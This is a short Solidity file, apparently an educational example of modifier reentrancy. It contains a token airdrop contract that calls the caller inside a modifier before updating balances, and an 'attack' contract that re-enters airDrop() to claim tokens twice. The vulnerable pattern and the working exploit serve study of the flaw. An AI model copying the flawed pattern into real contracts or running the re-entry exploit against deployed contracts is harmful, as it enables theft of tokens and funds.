pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  //If a contract has a zero balance and supports the token give them some token
  function airDrop() public hasNoBalance supportsToken {
    tokenBalance[msg.sender] += 20;
  }

  //Checks that the contract responds the way we want
  modifier supportsToken() {
    require(keccak256("Nu Token") == Bank(msg.sender).supportsToken());
    _;
  }

  //Checks that the caller has a zero balance
  modifier hasNoBalance() {
    require(tokenBalance[msg.sender] == 0);
    _;
  }
}

contract Bank {
  function supportsToken() public pure returns(bytes32) {
    return keccak256("Nu Token");
  }
}

contract attack { //An example of a contract that breaks the contract above.
  bool hasBeenCalled;
  function supportsToken() public returns(bytes32) {
    if(!hasBeenCalled) {
      hasBeenCalled = true;
      ModifierEntrancy(msg.sender).airDrop();
    }
    return keccak256("Nu Token");
  }
  function call(address token) public {
    ModifierEntrancy(token).airDrop();
  }
}